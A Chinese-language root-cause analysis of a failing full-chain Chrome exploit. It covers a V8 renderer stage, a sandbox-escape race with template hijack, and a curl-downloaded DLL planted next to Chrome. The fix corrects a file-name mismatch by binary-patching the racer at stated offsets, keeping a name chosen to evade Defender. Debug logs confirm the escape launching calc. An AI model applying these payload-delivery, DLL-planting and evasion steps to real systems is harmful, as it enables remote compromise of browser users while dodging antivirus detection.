# 根因分析 — 全链复现不胜：stage-2 植株源名字不一致（2026-10-20）

## 现象

原版包在本机（Win11 26300）全链复现 41 轮 0 胜，但分段验证时 78952 逃逸段单独跑
可以命中（`WAW#0` 模板劫持 + calc 弹出）。到达部署的轮次（`DEPLOYED`）竞态也能赢
（dbglog 见 `WAW#0 ... cs_=plant+0x10`），却始终没有 calc/notepad。

## 排查

1. Chrome 构建正确：152.0.7977.54（chrome.dll ProductVersion + manifest 同号），
   stage1 的 build 锁定 V8 map 常量每轮自检通过（`ST1 proof 13.37=13.37`）。
2. 崩溃 dump 尸检（mdmp.exe + cdb）：getter 阶段渲染器硬崩在
   `chrome.dll+0x555F854` 读 `cage+0x10000` 未提交页（0xc0000005，经
   `CrashForExceptionInNonABICompliantCodeRange` = V8 JIT/wasm 陷阱路径）。
   该崩溃把到达部署率从原机 83% 压到 ~24%，但它只影响效率，不是 0 胜的根因。
3. **决定性实验**：按 payload 的落盘布局忠实复刻 stage-2
   （`%TEMP%\s2test\ms64.exe` + `ev64.dll`，**无 evil.dll**）单独跑竞态器：

   ```
   [*] llw=0x7ffc7027f6c0 dllname=c810.7913.7ff6.dll
       src=...\s2test\evil.dll fin=FFFFFFFFFFFFFFFF      ← 源打开失败！
   [dbgwrap] WAW#0 ... cs_=0x7ff67913c810                 ← 竞态照样赢
   （无 calc）                                              ← 植株失败，LoadLibraryW 落空
   ```

## 根因

**poc.exe（ms64 竞态器）的植株源查找名硬编码为 `evil.dll`（`%s\evil.dll`，
`%s` = 自身 exe 目录），而 payload_src_w4.c 的 curl 把 DLL 落盘为 `ev64.dll`：**

```c
// payload_src_w4.c
static const char g_m2[] = "ev64.dll";        // curl -o "%TEMP%\ev64.dll"
...
d = acat(d, tmp); d = acat(d, g_m2);          // ← 落盘名 ev64.dll
```

```
; poc.exe 植株源查找
GetModuleFileNameA(NULL) → dirname + "\evil.dll"   ← 查找名 evil.dll
CreateFileA(src) → fin=INVALID → 跳过植株
```

两个名字不一致 → `CreateFileA` 打开源失败（`fin=FFFFFFFFFFFFFFFF`）→
`evil.dll → <handler基址派生名>.dll` 的植株步骤被静默跳过 → 竞态成功、
SMMW 模板劫持成功、Flush 派发 `LoadLibraryW(派生名.dll)` 时找不到文件 →
终局 DLL 永远不加载 → 不弹 calc。

报告 bug #16 曾记载同族症状（"poc 从自己 exe 同目录找 evil.dll —— 不在则
竞态赢了也白赢，曾 100+ 轮空转"）——原开发机的 %TEMP% 里有残留 evil.dll
（w4test 宿主回归台落的）掩盖了命名不一致，故 30 轮测试能赢 13 次。

## 修复

二进制补丁 poc.exe 两个字符串（等长，保留 Defender 规避用的 ev64 命名）：

| 原 | 改 | 偏移 |
|---|---|---|
| `%s\evil.dll` | `%s\ev64.dll` | 0x6ea0 |
| `[*] evil.dll planted` | `[*] ev64.dll planted` | 0x6ee5 |

## 修复后复测（忠实 stage-2 布局：ms64.exe + ev64.dll，无 evil.dll）

```
[*] llw=0x7ffc7027f6c0 dllname=c810.7913.7ff6.dll
    src=...\s2test\ev64.dll fin=00000000000000E8      ← 源打开成功
[*] ev64.dll planted -> ...\chrome-win64\             ← 植株成功
[dbgwrap] WAW#0 ... cs_=0x7ff67913c810               ← 模板劫持命中
→ CalculatorApp.exe 弹出（pid 21848, 23:42:14）       ← 逃逸达成
```

## 经验

1. **名字即契约**：curl 落盘名与竞态器查找名是跨文件契约，原版包两处各写各的；
   干净环境下 100% 暴露。复现陌生环境时应先做"忠实落盘布局"的分段测试。
2. **信标尸检要早做**：dump 分析 5 分钟就能排除/坐实方向，比烧轮数有效。
3. getter 阶段本机硬崩（cage+0x10000 未提交页）是次要环境敏感性，另有记录。
